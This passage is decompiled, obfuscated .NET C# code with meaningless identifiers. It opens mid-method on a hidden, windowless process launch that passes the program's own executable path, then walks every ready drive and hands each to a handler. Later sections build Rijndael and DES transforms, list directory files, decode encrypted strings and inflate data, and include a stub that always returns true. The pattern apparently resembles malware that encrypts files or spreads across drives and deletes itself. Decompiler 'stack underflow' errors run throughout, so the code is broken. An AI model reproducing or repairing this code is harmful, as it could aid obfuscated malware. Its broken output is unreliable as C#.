									Arguments = global::_0003._0002._0001(107388873) + Application.get_ExecutablePath() + global::_0003._0002._0001(107388856),
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									FileName = global::_0003._0002._0001(107388851)
								});
								return;
							}
							DriveInfo driveInfo = drives[num2];
							num = (driveInfo.IsReady ? 1 : 0);
							if (2 == 0)
							{
								continue;
							}
							if (num != 0)
							{
								_0001._0001(driveInfo);
							}
							num = num2;
						}
						if (8 == 0)
						{
							break;
						}
						num3 = 1;
						goto IL_00d3;
						IL_00d3:
						num2 = num + num3;
						goto IL_00d5;
					}
					break;
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _0004._0005._0004 _0001(_0004._0005._0005 P_0)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((_0004._0005._0005)/*Error near IL_0007: Stack underflow*/)._0003];
			_ = ((_0004._0005._0005)/*Error near IL_0015: Stack underflow*/)._0002;
			_ = ((_0004._0005._0005)/*Error near IL_001c: Stack underflow*/)._0002;
			_ = 0;
			Array.Copy(length: ((_0004._0005._0005)/*Error near IL_0026: Stack underflow*/)._0003, sourceArray: (Array)/*Error near IL_0044: Stack underflow*/, sourceIndex: (int)/*Error near IL_0044: Stack underflow*/, destinationArray: (Array)/*Error near IL_0044: Stack underflow*/, destinationIndex: (int)/*Error near IL_0044: Stack underflow*/);
			new _0004._0005._0004((byte[])/*Error near IL_004e: Stack underflow*/);
			return (_0004._0005._0004)/*Error near IL_002d: Stack underflow*/;
		}

		unsafe static int _0001(byte[] P_0, _0004._0005._0001 P_1, int P_2, int P_3)
		{
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0090: Incompatible stack heights: 0 vs 1
			//IL_0096: Incompatible stack heights: 0 vs 1
			//IL_009c: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 2
			//IL_00a8: Incompatible stack heights: 0 vs 1
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			*(int*)(nint)/*Error near IL_0010: Stack underflow*/ = 0;
			int num;
			int num2;
			do
			{
				IL_0015:
				num = ((_0004._0005._0001)/*Error near IL_001a: Stack underflow*/)._0001;
				num2 = 11;
				if (num2 == 0)
				{
					continue;
				}
				if (num != num2)
				{
					_ = /*Error near IL_0028: Stack underflow*/+ 4;
					_0004._0005._0003 obj = ((_0004._0005._0001)/*Error near IL_0041: Stack underflow*/)._0001;
					_0003._0001((int)/*Error near IL_00be: Stack underflow*/, (int)/*Error near IL_00be: Stack underflow*/, (byte[])/*Error near IL_00be: Stack underflow*/, obj);
					*(_003F*)(nint)/*Error near IL_0044: Stack underflow*/ = /*Error near IL_0044: Stack underflow*/;
					P_3 += *(int*)((byte*)ptr + 4);
					*(int*)ptr += *(int*)((byte*)ptr + 4);
					P_2 -= *(int*)((byte*)ptr + 4);
					if (P_2 == 0)
					{
						return *(int*)ptr;
					}
				}
				if (_0003._0001(P_1))
				{
					goto IL_0015;
				}
				num = P_1._0001._0002;
				num2 = 0;
			}
			while (num > num2 && P_1._0001 != 11);
			return *(int*)ptr;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static ICryptoTransform _0001(byte[] P_0, byte[] P_1, bool P_2)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			new RijndaelManaged();
			SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm)/*Error near IL_0061: Stack underflow*/;
			try
			{
				ICryptoTransform result;
				while (true)
				{
					if (0 == 0 && (int)/*Error near IL_000e: Stack underflow*/ == 0)
					{
						if (false)
						{
							continue;
						}
						((SymmetricAlgorithm)/*Error near IL_003c: Stack underflow*/).CreateEncryptor((byte[])/*Error near IL_003c: Stack underflow*/, (byte[]?)/*Error near IL_003c: Stack underflow*/);
						goto IL_0025;
					}
					goto IL_001f;
					IL_0025:
					result = (ICryptoTransform)/*Error near IL_0026: Stack underflow*/;
					if (3 == 0)
					{
						goto IL_001f;
					}
					break;
					IL_001f:
					((SymmetricAlgorithm)/*Error near IL_0025: Stack underflow*/).CreateDecryptor((byte[])/*Error near IL_0025: Stack underflow*/, P_0);
					goto IL_0025;
				}
				return result;
			}
			finally
			{
				if (6u != 0 && symmetricAlgorithm != null && 0 == 0)
				{
					((IDisposable)symmetricAlgorithm).Dispose();
				}
			}
		}

		static string _0001(int P_0)
		{
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Unknown result type (might be due to invalid IL or missing references)
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00eb: Incompatible stack heights: 0 vs 2
			//IL_00f7: Incompatible stack heights: 0 vs 1
			//IL_00fd: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 1
			//IL_010f: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_00e5: Stack underflow*/;
			_ = global::_0003._0002._0001;
			num++;
			int num2 = ((byte[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/];
			int count;
			if ((/*Error near IL_0029: Stack underflow*/ & 0x80) == 0)
			{
				count = (int)/*Error near IL_0103: Stack underflow*/;
				if ((int)/*Error near IL_003c: Stack underflow*/ == 0)
				{
					return string.Empty;
				}
			}
			else
			{
				count = (((/*Error near IL_004a: Stack underflow*/ & 0x40) != 0) ? (((num2 & 0x1F) << 24) + (global::_0003._0002._0001[num++] << 16) + (global::_0003._0002._0001[num++] << 8) + global::_0003._0002._0001[num++]) : (((num2 & 0x3F) << 8) + global::_0003._0002._0001[num++]));
			}
			try
			{
				byte[] array = Convert.FromBase64String(Encoding.UTF8.GetString(global::_0003._0002._0001, num, count));
				string text = string.Intern(Encoding.UTF8.GetString(array, 0, array.Length));
				if (global::_0003._0002._0001)
				{
					_0003._0001(P_0, text);
				}
				return text;
			}
			catch
			{
				return null;
			}
		}

		static bool _0001(Assembly P_0, Assembly P_1)
		{
			return true;
		}

		static string _0001(int P_0)
		{
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			object obj = global::_0003._0002._0001;
			Monitor.Enter((object)/*Error near IL_006d: Stack underflow*/);
			string result;
			try
			{
				_ = global::_0003._0002._0001;
				((Dictionary<int, string>)/*Error near IL_003a: Stack underflow*/).TryGetValue((int)/*Error near IL_003a: Stack underflow*/, out string _);
				if (false)
				{
					goto IL_002b;
				}
				if ((int)/*Error near IL_0024: Stack underflow*/ != 0)
				{
					goto IL_0024;
				}
				goto end_IL_0011;
				IL_0024:
				if (0 == 0)
				{
					result = (string)/*Error near IL_0043: Stack underflow*/;
					goto IL_002b;
				}
				goto end_IL_0011;
				IL_002b:
				if (0 == 0)
				{
					return result;
				}
				goto IL_0024;
				end_IL_0011:;
			}
			finally
			{
				do
				{
					Monitor.Exit(obj);
				}
				while (4 == 0);
			}
			if (0 == 0)
			{
				return _0003._0001((int)/*Error near IL_0059: Stack underflow*/);
			}
			return result;
		}

		static void _0001(int P_0, int P_1, _0004._0005._0002 P_2, byte[] P_3)
		{
			//IL_0017: Invalid comparison between Unknown and I4
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 2
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c0: Expected I4, but got Unknown
			//IL_00c6: Incompatible stack heights: 0 vs 2
			//IL_00cc: Incompatible stack heights: 0 vs 1
			//IL_00d2: Incompatible stack heights: 0 vs 1
			int num2;
			if (true)
			{
				_ = ((_0004._0005._0002)/*Error near IL_000d: Stack underflow*/)._0001;
				int num = ((_0004._0005._0002)/*Error near IL_0017: Stack underflow*/)._0002;
				if ((int)/*Error near IL_0019: Stack underflow*/ < num)
				{
					new InvalidOperationException();
					throw /*Error near IL_001f: Stack underflow*/;
				}
				num2 = /*Error near IL_002a: Stack underflow*/+ /*Error near IL_002a: Stack underflow*/;
				_ = 0;
				if (/*Error near IL_0037: Stack underflow*/ > /*Error near IL_0037: Stack underflow*/|| /*Error near IL_0043: Stack underflow*/> /*Error near IL_0043: Stack underflow*/|| num2 > P_3.Length)
				{
					throw new ArgumentOutOfRangeException();
				}
				if ((P_1 & 1) == 0)
				{
					goto IL_0087;
				}
				P_2._0001 |= (uint)((P_3[P_0++] & 0xFF) << P_2._0003);
			}
			P_2._0003 += 8;
			goto IL_0087;
			IL_0087:
			P_2._0001 = P_3;
			P_2._0001 = P_0;
			P_2._0002 = num2;
		}

		static void _0001(int P_0, string P_1)
		{
			//IL_0022: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			try
			{
				while (true)
				{
					object obj = global::_0003._0002._0001;
					if (5 == 0)
					{
						continue;
					}
					Monitor.Enter((object)/*Error near IL_0045: Stack underflow*/);
					try
					{
						do
						{
							_ = global::_0003._0002._0001;
							((Dictionary<int, string>)/*Error near IL_002c: Stack underflow*/).Add((int)/*Error near IL_002c: Stack underflow*/, (string)/*Error near IL_002c: Stack underflow*/);
						}
						while ((3 == 0) ? true : false);
					}
					finally
					{
						Monitor.Exit(obj);
					}
					if (0 == 0)
					{
						break;
					}
				}
			}
			catch
			{
			}
		}

		static int _0001(_0004._0005._0002 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0004._0005._0002)/*Error near IL_0007: Stack underflow*/)._0003;
		}

		static void _0001(_0004._0005._0003 P_0, int P_1, int P_2)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Invalid comparison between Unknown and I4
			//IL_0041: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 2
			//IL_00d9: Expected I4, but got Unknown
			//IL_00d9: Incompatible stack heights: 0 vs 1
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00e9: Incompatible stack heights: 0 vs 1
			//IL_00ef: Incompatible stack heights: 0 vs 1
			//IL_00f5: Incompatible stack heights: 0 vs 2
			//IL_00fb: Expected I4, but got Unknown
			_ = ((_0004._0005._0003)/*Error near IL_000f: Stack underflow*/)._0002;
			int num = /*Error near IL_0015: Stack underflow*/+ /*Error near IL_0015: Stack underflow*/;
			((_0004._0005._0003)/*Error near IL_0020: Stack underflow*/)._0002 = (int)/*Error near IL_0020: Stack underflow*/;
			if ((int)/*Error near IL_002c: Stack underflow*/ > 32768)
			{
				new InvalidOperationException();
				throw /*Error near IL_0032: Stack underflow*/;
			}
			_ = ((_0004._0005._0003)/*Error near IL_003c: Stack underflow*/)._0001;
			int num2 = (/*Error near IL_0042: Stack underflow*/ - /*Error near IL_0042: Stack underflow*/) & 0x7FFF;
			int num3 = 32768 - P_1;
			if (num2 <= num3 && P_0._0001 < num3)
			{
				if (P_1 <= P_2)
				{
					Array.Copy(P_0._0001, num2, P_0._0001, P_0._0001, P_1);
					P_0._0001 += P_1;
				}
				else
				{
					while (P_1-- > 0)
					{
						P_0._0001[P_0._0001++] = P_0._0001[num2++];
					}
				}
			}
			else
			{
				_0003._0001(P_0, num2, P_1, P_2);
			}
		}

		static bool _0001(_0004._0005._0002 P_0)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 2
			_ = ((_0004._0005._0002)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((_0004._0005._0002)/*Error near IL_000e: Stack underflow*/)._0002;
			return (int)/*Error near IL_0010: Stack underflow*/ == num;
		}

		static int _0001(_0004._0005._0007 P_0)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected I4, but got Unknown
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			_0003._0001((_0004._0005._0007)/*Error near IL_0015: Stack underflow*/);
			_0003._0001((_0004._0005._0007)/*Error near IL_001f: Stack underflow*/);
			_003F val = /*Error near IL_000b: Stack underflow*/<< 16;
			return /*Error near IL_000c: Stack underflow*/| val;
		}

		static FileInfo[] _0001(string P_0)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				if (true)
				{
					new DirectoryInfo((string)/*Error near IL_0015: Stack underflow*/);
					((DirectoryInfo)/*Error near IL_001c: Stack underflow*/).GetFiles();
					FileInfo[] array = (FileInfo[])/*Error near IL_001f: Stack underflow*/;
				}
			}
			catch (Exception)
			{
				FileInfo[] array = null;
			}
			return (FileInfo[])/*Error near IL_0029: Stack underflow*/;
		}

		unsafe static int _0001(_0004._0005._0003 P_0, _0004._0005._0002 P_1, int P_2)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d2: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 2
			//IL_00e2: Incompatible stack heights: 0 vs 1
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f2: Incompatible stack heights: 0 vs 1
			//IL_00fc: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			int num = 32768;
			if (num != 0)
			{
				int num2 = ((_0004._0005._0003)/*Error near IL_0020: Stack underflow*/)._0002;
				num = /*Error near IL_0021: Stack underflow*/- num2;
			}
			Math.Min((int)/*Error near IL_00e2: Stack underflow*/, num);
			_0003._0001((_0004._0005._0002)/*Error near IL_00f2: Stack underflow*/);
			Math.Min((int)/*Error near IL_00fc: Stack underflow*/, (int)/*Error near IL_00fc: Stack underflow*/);
			P_2 = (int)/*Error near IL_0103: Stack underflow*/;
			*(int*)(nint)(/*Error near IL_0041: Stack underflow*/ + 4) = 32768 - P_0._0001;
			if (P_2 > *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr = _0003._0001(P_1, P_0._0001, P_0._0001, *(int*)((byte*)ptr + 4));
				if (*(int*)ptr == *(int*)((byte*)ptr + 4))
				{
					*(int*)ptr += _0003._0001(P_1, P_0._0001, 0, P_2 - *(int*)((byte*)ptr + 4));
				}
			}
			else
			{
				*(int*)ptr = _0003._0001(P_1, P_0._0001, P_0._0001, P_2);
			}
			P_0._0001 = (P_0._0001 + *(int*)ptr) & 0x7FFF;
			P_0._0002 += *(int*)ptr;
			return *(int*)ptr;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static bool _0001(_0004._0005._0005 P_0, _0004._0005._0002 P_1)
		{
			//IL_02bd: Incompatible stack heights: 0 vs 1
			//IL_02c3: Incompatible stack heights: 0 vs 1
			//IL_02c9: Incompatible stack heights: 0 vs 1
			//IL_02cf: Incompatible stack heights: 0 vs 1
			//IL_02d5: Incompatible stack heights: 0 vs 1
			//IL_02df: Incompatible stack heights: 0 vs 1
			//IL_02e5: Incompatible stack heights: 0 vs 1
			//IL_02eb: Incompatible stack heights: 0 vs 1
			byte* num = stackalloc byte[12];
			void* ptr;
			if (2u != 0)
			{
				ptr = num;
			}
			int num7 = default(int);
			while (true)
			{
				int num2 = ((_0004._0005._0005)/*Error near IL_001b: Stack underflow*/)._0001;
				*(int*)(nint)/*Error near IL_001c: Stack underflow*/ = num2;
				while (true)
				{
					int num3;
					int num11;
					int num8;
					int num6;
					int num9;
					int num10;
					int num4;
					byte[] array2;
					switch (*(int*)(nint)/*Error near IL_0022: Stack underflow*/)
					{
					case 0:
						_0003._0001((_0004._0005._0002)/*Error near IL_02df: Stack underflow*/, 5);
						((_0004._0005._0005)/*Error near IL_0056: Stack underflow*/)._0002 = (int)/*Error near IL_0056: Stack underflow*/;
						goto IL_005b;
					case 1:
						P_0._0003 = _0003._0001(P_1, 5);
						if (P_0._0003 < 0)
						{
							return false;
						}
						P_0._0003++;
						_0003._0001(P_1, 5);
						P_0._0005 = P_0._0002 + P_0._0003;
						P_0._0002 = new byte[P_0._0005];
						P_0._0001 = 2;
						goto case 2;
					case 2:
						if (8 == 0)
						{
							continue;
						}
						P_0._0004 = _0003._0001(P_1, 4);
						num3 = P_0._0004;
						num11 = 0;
						if (num11 == 0)
						{
							if (num3 < num11)
							{
								goto IL_0109;
							}
							P_0._0004 += 4;
							_0003._0001(P_1, 4);
							P_0._0001 = new byte[19];
							goto IL_012d;
						}
						goto IL_0290;
					case 3:
						while (P_0._0007 < P_0._0004)
						{
							*(int*)((byte*)ptr + 4) = _0003._0001(P_1, 3);
							if (*(int*)((byte*)ptr + 4) < 0)
							{
								return false;
							}
							_0003._0001(P_1, 3);
							P_0._0001[_0004._0005._0005._0003[P_0._0007]] = (byte)(*(uint*)((byte*)ptr + 4));
							P_0._0007++;
						}
						P_0._0001 = new _0004._0005._0004(P_0._0001);
						P_0._0001 = null;
						P_0._0007 = 0;
						P_0._0001 = 4;
						goto case 4;
					case 4:
						num8 = (num7 = _0003._0001(P_0._0001, P_1)) & -16;
						goto IL_01fb;
					case 5:
						{
							*(int*)((byte*)ptr + 8) = _0004._0005._0005._0002[P_0._0006];
							if (false)
							{
								goto IL_012d;
							}
							num10 = _0003._0001(P_1, *(int*)((byte*)ptr + 8));
							if (num10 < 0)
							{
								num6 = 0;
								if (num6 == 0)
								{
									return (byte)num6 != 0;
								}
								goto IL_01e0;
							}
							_0003._0001(P_1, *(int*)((byte*)ptr + 8));
							num8 = num10;
							if (8 == 0)
							{
								goto IL_01fb;
							}
							num9 = num8 + _0004._0005._0005._0001[P_0._0006];
							if (false)
							{
								goto IL_0204;
							}
							num10 = num9;
							goto IL_028c;
						}
						IL_005b:
						num3 = ((_0004._0005._0005)/*Error near IL_0060: Stack underflow*/)._0002;
						num4 = 0;
						if (num4 == 0)
						{
							if (num3 < num4)
							{
								return false;
							}
							int num5 = P_0._0002;
							((_0004._0005._0005)/*Error near IL_0081: Stack underflow*/)._0002 = num5 + 257;
							_0003._0001(P_1, 5);
							P_0._0001 = 1;
							goto case 1;
						}
						goto IL_028e;
						IL_01e0:
						if (num6 == P_0._0005)
						{
							return true;
						}
						goto case 4;
						IL_01fb:
						if (num8 == 0)
						{
							byte[] array = P_0._0002;
							*(int*)ptr = P_0._0007;
							P_0._0007 = *(int*)ptr + 1;
							array[*(int*)ptr] = (P_0._0001 = (byte)num7);
							num6 = P_0._0007;
							goto IL_01e0;
						}
						if (num7 < 0)
						{
							return false;
						}
						num9 = num7;
						goto IL_0204;
						IL_0290:
						num10 = num11;
						if (num3 <= 0)
						{
							if (P_0._0007 == P_0._0005)
							{
								return true;
							}
							P_0._0001 = 4;
							if (0 == 0)
							{
								break;
							}
							goto IL_005b;
						}
						array2 = P_0._0002;
						*(int*)ptr = P_0._0007;
						P_0._0007 = *(int*)ptr + 1;
						array2[*(int*)ptr] = P_0._0001;
						goto IL_028c;
						IL_028c:
						num3 = num10;
						num4 = num3;
						goto IL_028e;
						IL_0204:
						if (num9 >= 17)
						{
							P_0._0001 = 0;
						}
						P_0._0006 = num7 - 16;
						P_0._0001 = 5;
						goto case 5;
						IL_028e:
						num11 = num4 - 1;
						goto IL_0290;
						IL_012d:
						P_0._0007 = 0;
						P_0._0001 = 3;
						goto case 3;
					}
					break;
					IL_0109:
					return false;
				}
			}
		}

		static _0004._0005._0004 _0001(_0004._0005._0005 P_0)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 3
			//IL_0034: Incompatible stack heights: 0 vs 2
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((_0004._0005._0005)/*Error near IL_0007: Stack underflow*/)._0002];
			_ = ((_0004._0005._0005)/*Error near IL_0015: Stack underflow*/)._0002;
			_ = 0;
			_ = 0;
			Array.Copy(length: ((_0004._0005._0005)/*Error near IL_0020: Stack underflow*/)._0002, sourceArray: (Array)/*Error near IL_003b: Stack underflow*/, sourceIndex: (int)/*Error near IL_003b: Stack underflow*/, destinationArray: (Array)/*Error near IL_003b: Stack underflow*/, destinationIndex: (int)/*Error near IL_003b: Stack underflow*/);
			new _0004._0005._0004((byte[])/*Error near IL_0045: Stack underflow*/);
			return (_0004._0005._0004)/*Error near IL_0027: Stack underflow*/;
		}

		static ICryptoTransform _0001(bool P_0, byte[] P_1, byte[] P_2)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			new DESCryptoServiceProvider();
			DESCryptoServiceProvider dESCryptoServiceProvider = (DESCryptoServiceProvider)/*Error near IL_0061: Stack underflow*/;
			try
			{
				ICryptoTransform result;
				while (true)
				{
					if (0 == 0 && (int)/*Error near IL_000e: Stack underflow*/ == 0)
					{
						if (false)
						{
							continue;
						}
						((SymmetricAlgorithm)/*Error near IL_003c: Stack underflow*/).CreateEncryptor((byte[])/*Error near IL_003c: Stack underflow*/, (byte[]?)/*Error near IL_003c: Stack underflow*/);
						goto IL_0025;
					}
					goto IL_001f;
					IL_0025:
					result = (ICryptoTransform)/*Error near IL_0026: Stack underflow*/;
					if (3 == 0)
					{
						goto IL_001f;
					}
					break;
					IL_001f:
					((SymmetricAlgorithm)/*Error near IL_0025: Stack underflow*/).CreateDecryptor((byte[])/*Error near IL_0025: Stack underflow*/, P_1);
					goto IL_0025;
				}
				return result;
			}
			finally
			{
				if (6u != 0 && dESCryptoServiceProvider != null && 0 == 0)
				{
					((IDisposable)dESCryptoServiceProvider).Dispose();
				}
			}
		}

		static int _0001(_0004._0005._0003 P_0)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected I4, but got Unknown
			//IL_000f: Incompatible stack heights: 0 vs 2
			_ = 32768;
			int num = ((_0004._0005._0003)/*Error near IL_000c: Stack underflow*/)._0002;
			return /*Error near IL_000d: Stack underflow*/- num;
		}
	}
}
namespace _0002
{
	[CompilerGenerated]
	internal sealed class _0002
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		internal struct _0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 76)]
		private struct _0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 120)]
		private struct _0005
		{
		}

		internal static readonly _0003 _0001/* Not supported: data(10 00 00 00 11 00 00 00 12 00 00 00 00 00 00 00 08 00 00 00 07 00 00 00 09 00 00 00 06 00 00 00 0A 00 00 00 05 00 00 00 0B 00 00 00 04 00 00 00 0C 00 00 00 03 00 00 00 0D 00 00 00 02 00 00 00 0E 00 00 00 01 00 00 00 0F 00 00 00) */;

		internal static readonly _0002 _0001/* Not supported: data(01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01) */;

		internal static readonly _0004 _0001/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 00 00 00 00) */;

		internal static readonly _0005 _0001/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 06 00 00 00 06 00 00 00 07 00 00 00 07 00 00 00 08 00 00 00 08 00 00 00 09 00 00 00 09 00 00 00 0A 00 00 00 0A 00 00 00 0B 00 00 00 0B 00 00 00 0C 00 00 00 0C 00 00 00 0D 00 00 00 0D 00 00 00) */;

		internal static readonly _0002 _0002/* Not supported: data(00 08 04 0C 02 0A 06 0E 01 09 05 0D 03 0B 07 0F) */;

		internal static readonly _0002 _0003/* Not supported: data(02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02) */;

		internal static readonly _0001 _0001/* Not supported: data(02 00 00 00 03 00 00 00 07 00 00 00) */;

		internal static readonly _0001 _0002/* Not supported: data(03 00 00 00 03 00 00 00 0B 00 00 00) */;

		internal static readonly long _0001/* Not supported: data(C6 5D 24 4D 22 B5 E2 81) */;

		internal static readonly long _0002/* Not supported: data(CF 31 AC 00 4A 31 A7 8D) */;

		internal static readonly _0005 _0002/* Not supported: data(01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 07 00 00 00 09 00 00 00 0D 00 00 00 11 00 00 00 19 00 00 00 21 00 00 00 31 00 00 00 41 00 00 00 61 00 00 00 81 00 00 00 C1 00 00 00 01 01 00 00 81 01 00 00 01 02 00 00 01 03 00 00 01 04 00 00 01 06 00 00 01 08 00 00 01 0C 00 00 01 10 00 00 01 18 00 00 01 20 00 00 01 30 00 00 01 40 00 00 01 60 00 00) */;

		internal static readonly _0004 _0002/* Not supported: data(03 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 0A 00 00 00 0B 00 00 00 0D 00 00 00 0F 00 00 00 11 00 00 00 13 00 00 00 17 00 00 00 1B 00 00 00 1F 00 00 00 23 00 00 00 2B 00 00 00 33 00 00 00 3B 00 00 00 43 00 00 00 53 00 00 00 63 00 00 00 73 00 00 00 83 00 00 00 A3 00 00 00 C3 00 00 00 E3 00 00 00 02 01 00 00) */;
	}
}
